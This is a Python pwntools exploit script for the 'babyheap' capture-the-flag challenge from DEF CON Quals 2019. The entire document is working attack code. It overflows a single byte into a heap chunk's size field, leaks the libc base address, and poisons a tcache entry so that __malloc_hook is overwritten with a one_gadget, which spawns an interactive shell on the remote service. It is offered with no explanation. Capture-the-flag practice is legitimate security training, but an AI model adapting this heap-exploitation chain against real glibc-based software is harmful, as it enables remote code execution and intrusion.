#!/usr/bin/env python
from pwn import *

def malloc(size, content='A'):
    s.sendlineafter('Command:\n', 'M')
    s.sendlineafter('Size:\n', str(size))
    s.sendlineafter('Content:\n', content)

def free(index):
    s.sendlineafter('Command:\n', 'F')
    s.sendlineafter('Index:\n> ', str(index))

def show(index):
    s.sendlineafter('Command:\n', 'S')
    s.sendlineafter('Index:\n> ', str(index))
    return s.recvline(False)

if len(sys.argv) == 1:
    s = process('./babyheap')
else:
    s = remote('babyheap.quals2019.oooverflow.io', 5000)

libc = ELF('./libc.so')

for i in range(8):
    malloc(0xf8)
for i in range(3, 8):
    free(i)
for i in range(3):
    free(i)
malloc(0xf8)
malloc(0xf8, 'A' * 0xf8 + '\x81')
free(0)
malloc(0x178, 'A' * 0x100)
libc_base = u64(show(0)[0x100:].ljust(8, '\0')) - 0x1e4ca0
log.info('libc base: %#x' % libc_base)

malloc(0xf8)
malloc(0xf8)
malloc(0xf8, 'A' * 0xf8 + '\x81')
free(3)
free(2)
malloc(0x178, 'A' * 0x100 + p64(libc_base + libc.symbols['__malloc_hook'])[:6])
malloc(0xf8)
one_gadgets = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
malloc(0xf8, p64(libc_base + one_gadgets[1])[:6])
s.sendline('M')
s.sendline(str(0xf8))
s.interactive()
